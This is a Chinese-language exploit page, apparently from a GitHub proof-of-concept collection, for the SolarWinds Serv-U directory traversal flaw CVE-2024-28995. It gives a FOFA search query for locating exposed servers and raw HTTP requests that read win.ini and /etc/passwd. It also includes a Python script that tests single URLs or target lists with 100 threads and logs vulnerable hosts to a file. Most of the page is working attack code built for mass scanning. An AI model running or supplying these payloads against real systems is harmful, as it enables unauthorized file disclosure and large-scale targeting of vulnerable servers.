# SolarWinds Serv-U 目录遍历漏洞(CVE-2024-28995)

### 漏洞描述

Serv-U 的目录遍历漏洞（CVE-2024-28995）是由于在处理路径时缺乏适当的验证。攻击者可以通过传递包含 “…/” 的路径段绕过路径验证，访问任意文件。

### fofa搜索语法

```plain
server="Serv-U"
```

### 漏洞复现

Windows-poc

```plain
GET /?InternalDir=/../../../../windows&InternalFile=win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


```

![image](https://github.com/hardog123/poc-exp/assets/170905460/d54ff660-fa8c-4d94-b208-0819eb5c156f)


Linux-poc

```plain
GET /?InternalDir=\..\..\..\..\etc&InternalFile=passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


```

![image](https://github.com/hardog123/poc-exp/assets/170905460/c2aec376-1962-4fdc-b848-881e0f6d2512)

### poc脚本

~~~markdown
import requests,argparse,sys,json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = """
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                     
                                                                                                                    
                                version:1.1.0                     
                                author:mazha.top
"""
    print(test)


def main():
    banner()

    parser = argparse.ArgumentParser(description='SolarWinds Serv-U 目录遍历漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload_url1 = '/?InternalDir=/../../../../windows&InternalFile=win.ini'
    payload_url2 = '/?InternalDir=\..\..\..\..\etc&InternalFile=passwd'
    url1 = target + payload_url1
    url2 = target + payload_url2
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Accept':'*/*',
        'Connection':'keep-alive',
    }

    try:
        response1 = requests.get(url=url1,headers=headers,verify=False,timeout=5)
        response2 = requests.get(url=url2,headers=headers,verify=False,timeout=5)

        # 检查响应状态码
        if response1.status_code == 200 and "fonts" in response1.text:
            print(f"{GREEN}[+] 存在目录遍历漏洞！{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')

        elif response2.status_code == 200 and "root" in response2.text:
            print(f"{GREEN}[+] 存在目录遍历漏洞！{target}\n{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-] 不存在目录遍历漏洞!")

    except Exception as e:
        print("[*] 无法访问")

if __name__ == '__main__':
    main()
~~~

